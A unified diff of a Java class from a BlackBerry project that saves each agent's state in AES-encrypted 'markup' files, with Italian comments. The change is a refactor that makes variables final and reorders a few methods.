@@ -10,7 +10,6 @@ package blackberry.log;
 import java.io.IOException;
 
 import net.rim.device.api.util.NumberUtilities;
-
 import blackberry.agent.Agent;
 import blackberry.config.Keys;
 import blackberry.crypto.Encryption;
@@ -28,7 +27,7 @@ public class Markup {
 
     private int agentId = 0;
 
-	//#debug
+    //#debug
     private static Debug debug = new Debug("Markup", DebugLevel.VERBOSE);
 
     /**
@@ -36,15 +35,15 @@ public class Markup {
      * stringa lo genera da un numero. Se la chiamata fallisce la funzione torna
      * una stringa vuota.
      */
-    static String makeMarkupName(int agentId, boolean addPath) {
+    static String makeMarkupName(final int agentId, final boolean addPath) {
         // #ifdef DBC
         Check.requires(agentId >= 0, "agentId < 0");
         // #endif
-        String logName = NumberUtilities.toString(agentId, 16, 4);
+        final String logName = NumberUtilities.toString(agentId, 16, 4);
         // #debug
         debug.trace("makeMarkupName from: " + logName);
 
-        String markupName = makeMarkupName(logName, addPath, false);
+        final String markupName = makeMarkupName(logName, addPath, false);
         return markupName;
     }
 
@@ -58,8 +57,8 @@ public class Markup {
      * e' impostato a TRUE viene generato un nome che punta alla prima MMC
      * disponibile, se esiste.
      */
-    static String makeMarkupName(String markupName, boolean addPath,
-            boolean storeToMMC) {
+    static String makeMarkupName(final String markupName,
+            final boolean addPath, final boolean storeToMMC) {
         // #ifdef DBC
         Check.requires(markupName != null, "null markupName");
         // #endif
@@ -91,32 +90,18 @@ public class Markup {
      * stato possibile rimuoverlo.
      */
 
-    public static synchronized void removeMarkup(int agentId_) {
+    public static synchronized void removeMarkup(final int agentId_) {
         // #ifdef DBC
         Check.requires(agentId_ > 0, "agentId null");
         // #endif
 
-        String markupName = makeMarkupName(agentId_, true);
+        final String markupName = makeMarkupName(agentId_, true);
         // #ifdef DBC
         Check.asserts(markupName != "", "markupName empty");
         // #endif
 
-        AutoFlashFile file = new AutoFlashFile(markupName, true);
+        final AutoFlashFile file = new AutoFlashFile(markupName, true);
         file.delete();
-    }
-
-    public synchronized void removeMarkup() {
-        // #ifdef DBC
-        Check.requires(agentId > 0, "agentId null");
-        // #endif
-
-        String markupName = makeMarkupName(agentId, true);
-        // #ifdef DBC
-        Check.asserts(markupName != "", "markupName empty");
-        // #endif
-
-        AutoFlashFile remove = new AutoFlashFile(markupName, true);
-        remove.delete();
     }
 
     /**
@@ -167,9 +152,9 @@ public class Markup {
         encryption = new Encryption();
     }
 
-    public Markup(int agentId_, byte[] aesKey) {
+    public Markup(final int agentId_, final byte[] aesKey) {
         this();
-        byte[] key = new byte[16];
+        final byte[] key = new byte[16];
         Utils.copy(key, 0, aesKey, 0, 16);
 
         encryption.makeKey(key);
@@ -177,17 +162,26 @@ public class Markup {
         this.agentId = agentId_;
     }
 
+    /**
+     * Crea un markup vuoto.
+     * 
+     * @return true if successful
+     */
+    public boolean createEmptyMarkup() {
+        return writeMarkup(null);
+    }
+
     public synchronized boolean isMarkup() {
         // #ifdef DBC
         Check.requires(agentId > 0, "agentId null");
         // #endif
 
-        String markupName = makeMarkupName(agentId, true);
+        final String markupName = makeMarkupName(agentId, true);
         // #ifdef DBC
         Check.asserts(markupName != "", "markupName empty");
         // #endif
 
-        AutoFlashFile fileRet = new AutoFlashFile(markupName, true);
+        final AutoFlashFile fileRet = new AutoFlashFile(markupName, true);
 
         return fileRet.exists();
     }
@@ -207,18 +201,18 @@ public class Markup {
         Check.requires(agentId > 0, "agentId null");
         // #endif
 
-        String markupName = makeMarkupName(agentId, true);
+        final String markupName = makeMarkupName(agentId, true);
         // #ifdef DBC
         Check.asserts(markupName != "", "markupName empty");
         // #endif
 
-        AutoFlashFile fileRet = new AutoFlashFile(markupName, true);
+        final AutoFlashFile fileRet = new AutoFlashFile(markupName, true);
 
         if (fileRet.exists()) {
-            byte[] encData = fileRet.read();
-            int len = Utils.byteArrayToInt(encData, 0);
+            final byte[] encData = fileRet.read();
+            final int len = Utils.byteArrayToInt(encData, 0);
 
-            byte[] plain = encryption.decryptData(encData, len, 4);
+            final byte[] plain = encryption.decryptData(encData, len, 4);
             // #ifdef DBC
             Check.asserts(plain != null, "wrong decryption: null");
             // #endif
@@ -234,6 +228,20 @@ public class Markup {
         }
     }
 
+    public synchronized void removeMarkup() {
+        // #ifdef DBC
+        Check.requires(agentId > 0, "agentId null");
+        // #endif
+
+        final String markupName = makeMarkupName(agentId, true);
+        // #ifdef DBC
+        Check.asserts(markupName != "", "markupName empty");
+        // #endif
+
+        final AutoFlashFile remove = new AutoFlashFile(markupName, true);
+        remove.delete();
+    }
+
     /**
      * Scrive un file di markup per salvare lo stato dell'agente, il parametro
      * e' il buffer di dati. Al termine della scrittura il file viene chiuso,
@@ -242,19 +250,19 @@ public class Markup {
      * funzione torna TRUE se e' andata a buon fine, FALSE altrimenti. Il
      * contenuto scritto e' cifrato.
      */
-    public synchronized boolean writeMarkup(byte[] data) {
-        String markupName = makeMarkupName(agentId, true);
+    public synchronized boolean writeMarkup(final byte[] data) {
+        final String markupName = makeMarkupName(agentId, true);
         // #ifdef DBC
         Check.asserts(markupName != "", "markupName empty");
         // #endif
 
-        AutoFlashFile fileRet = new AutoFlashFile(markupName, true);
+        final AutoFlashFile fileRet = new AutoFlashFile(markupName, true);
 
         // se il file esiste viene azzerato
         fileRet.create();
 
         if (data != null) {
-            byte[] encData = encryption.encryptData(data);
+            final byte[] encData = encryption.encryptData(data);
             // #ifdef DBC
             Check.asserts(encData.length >= data.length, "strange data len");
             // #endif
@@ -263,14 +271,5 @@ public class Markup {
         }
 
         return true;
-    }
-
-    /**
-     * Crea un markup vuoto.
-     * 
-     * @return true if successful
-     */
-    public boolean createEmptyMarkup() {
-        return writeMarkup(null);
     }
 }
